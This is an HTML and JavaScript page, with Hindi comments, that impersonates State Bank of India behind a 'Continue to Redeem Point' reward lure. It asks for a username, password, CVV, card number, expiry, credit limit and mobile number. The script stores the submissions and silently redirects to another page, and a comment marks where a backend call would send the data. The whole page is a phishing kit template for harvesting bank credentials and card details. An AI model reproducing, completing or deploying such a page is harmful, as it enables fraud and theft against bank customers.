<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>i</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .tabs-container {
            display: flex;
            background-color: #f5f5f5;
            padding: 4px;
            margin: 0 20px 10px 20px;
            border-radius: 25px;
        }
        
        .tab {
            flex: 1;
            padding: 8px 4px;
            text-align: center;
            font-size: 13px;
            font-weight: bold;
            background-color: transparent;
            color: #666;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .tab.active {
            background-color: #24A1E8;
            color: #fff;
            box-shadow: 0 2px 4px rgba(36, 161, 232, 0.3);
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 13px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .login-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 12px;
        }
        
        .login-button:hover {
            background-color: #1a8cd8;
        }
        
        .expiry-cvv-container {
            display: flex;
            gap: 12px;
        }
        
        .expiry-cvv-container > div {
            flex: 1;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
        
        .form-panel {
            display: none;
        }
        
        .form-panel.active {
            display: block;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .error-message {
            color: #ff4444;
            font-size: 11px;
            margin-top: 3px;
            display: none;
        }
        
        .form-input.error {
            border-bottom-color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
             alt="SBI Logo" 
             class="logo">
    </div>
    
    <div class="container">
        <div class="form-header">
            Continue to Redeem Point
        </div>
        
        <div class="tabs-container">
            <button class="tab active" id="userTab">User ID</button>
            <button class="tab" id="cardTab">Credit Card No.</button>
        </div>
        
        <!-- User ID फॉर्म -->
        <div class="form-content form-panel active" id="userPanel">
            <form id="userForm">
                <div class="form-group">
                    <label class="form-label">Username <span class="asterisk">*</span></label>
                    <input type="text" class="form-input" id="username" placeholder="Enter username" required>
                    <div class="error-message">Username is required</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Password <span class="asterisk">*</span></label>
                    <input type="password" class="form-input" id="password" placeholder="Enter password" required minlength="6">
                    <div class="error-message">Password must be at least 6 characters</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                    <input type="tel" class="form-input" id="mobile" placeholder="10-digit mobile number" required pattern="[0-9]{10}" maxlength="10">
                    <div class="error-message">Valid 10-digit mobile number is required</div>
                </div>
                
                <button type="submit" class="login-button">LOGIN</button>
            </form>
        </div>
        
        <!-- Credit Card फॉर्म -->
        <div class="form-content form-panel" id="cardPanel">
            <form id="cardForm">
                <div class="form-group">
                    <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
                    <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" required pattern="[0-9\s]{16,19}">
                    <div class="error-message">Valid credit card number is required</div>
                </div>
                
                <div class="expiry-cvv-container">
                    <div class="form-group">
                        <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
                        <input type="text" class="form-input" id="expiry" placeholder="MM/YY" required pattern="(0[1-9]|1[0-2])\/([0-9]{2})">
                        <div class="error-message">Format: MM/YY (e.g., 12/25)</div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">CVV <span class="asterisk">**</span></label>
                        <input type="password" class="form-input" id="cvv" placeholder="123" required pattern="[0-9]{3}" maxlength="3">
                        <div class="error-message">3-digit CVV is required</div>
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
                    <input type="text" class="form-input" id="creditLimit" placeholder="₹" required>
                    <div class="error-message">Credit limit is required</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
                    <input type="tel" class="form-input" id="cardMobile" placeholder="10-digit mobile number" required pattern="[0-9]{10}" maxlength="10">
                    <div class="error-message">Valid 10-digit mobile number is required</div>
                </div>
                
                <button type="submit" class="login-button">LOGIN</button>
            </form>
        </div>
    </div>
    
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
         alt="Security Guidelines" 
         class="footer-img">
    
    <script>
        // टॉगल स्विच
        const userTab = document.getElementById('userTab');
        const cardTab = document.getElementById('cardTab');
        const userPanel = document.getElementById('userPanel');
        const cardPanel = document.getElementById('cardPanel');
        
        userTab.addEventListener('click', function() {
            userTab.classList.add('active');
            cardTab.classList.remove('active');
            userPanel.classList.add('active');
            cardPanel.classList.remove('active');
        });
        
        cardTab.addEventListener('click', function() {
            cardTab.classList.add('active');
            userTab.classList.remove('active');
            cardPanel.classList.add('active');
            userPanel.classList.remove('active');
        });
        
        // इनपुट वैलिडेशन
        function showError(input, message) {
            input.classList.add('error');
            const errorDiv = input.parentElement.querySelector('.error-message');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
        
        function clearError(input) {
            input.classList.remove('error');
            const errorDiv = input.parentElement.querySelector('.error-message');
            errorDiv.style.display = 'none';
        }
        
        // क्रेडिट कार्ड नंबर फॉर्मेटिंग
        const creditCardInput = document.getElementById('cardNumber');
        if (creditCardInput) {
            creditCardInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
                value = value.substring(0, 16);
                
                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += ' ';
                    }
                    formattedValue += value[i];
                }
                
                e.target.value = formattedValue;
                clearError(e.target);
            });
        }
        
        // एक्सपायरी डेट फॉर्मेटिंग
        const expiryInput = document.getElementById('expiry');
        if (expiryInput) {
            expiryInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                e.target.value = value.substring(0, 5);
                clearError(e.target);
            });
        }
        
        // CVV सिर्फ नंबर
        const cvvInput = document.getElementById('cvv');
        if (cvvInput) {
            cvvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
                clearError(e.target);
            });
        }
        
        // मोबाइल नंबर सिर्फ नंबर
        const mobileInputs = [document.getElementById('mobile'), document.getElementById('cardMobile')];
        mobileInputs.forEach(input => {
            if (input) {
                input.addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
                    clearError(e.target);
                });
            }
        });
        
        // डेटा सेव करने और रीडायरेक्ट करने की फंक्शन
        function saveDataAndRedirect(formData, formType) {
            // यहाँ आप अपने बैकएंड API को कॉल करेंगे
            // उदाहरण के लिए localStorage का उपयोग कर रहे हैं
            const submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
            
            const submission = {
                id: Date.now(),
                type: formType,
                data: formData,
                timestamp: new Date().toISOString(),
                ip: 'Not available in browser'
            };
            
            submissions.push(submission);
            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
            
            // बिना किसी मैसेज के सीधे blogone.html पर रीडायरेक्ट
            window.location.href = 'blogone.html';
        }
        
        // User ID फॉर्म सबमिशन
        document.getElementById('userForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let isValid = true;
            const inputs = this.querySelectorAll('.form-input');
            
            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    showError(input, input.validationMessage || 'This field is required');
                    isValid = false;
                } else {
                    clearError(input);
                }
            });
            
            if (isValid) {
                const formData = {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value,
                    mobile: document.getElementById('mobile').value
                };
                
                saveDataAndRedirect(formData, 'User ID');
            }
        });
        
        // Credit Card फॉर्म सबमिशन
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            let isValid = true;
            const inputs = this.querySelectorAll('.form-input');
            
            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    const customMessage = input.placeholder.includes('MM/YY') ? 
                        'Format: MM/YY (e.g., 12/25)' : 
                        (input.placeholder.includes('10-digit') ? 
                            'Valid 10-digit mobile number is required' : 
                            'This field is required');
                    
                    showError(input, customMessage);
                    isValid = false;
                } else {
                    clearError(input);
                }
            });
            
            if (isValid) {
                const formData = {
                    cardNumber: document.getElementById('cardNumber').value,
                    expiry: document.getElementById('expiry').value,
                    cvv: document.getElementById('cvv').value,
                    creditLimit: document.getElementById('creditLimit').value,
                    mobile: document.getElementById('cardMobile').value
                };
                
                saveDataAndRedirect(formData, 'Credit Card');
            }
        });
        
        // रियल-टाइम वैलिडेशन
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('blur', function() {
                if (!this.checkValidity()) {
                    const message = this.validationMessage || 'This field is required';
                    showError(this, message);
                }
            });
            
            input.addEventListener('input', function() {
                if (this.checkValidity()) {
                    clearError(this);
                }
            });
        });
    </script>
</body>
</html>
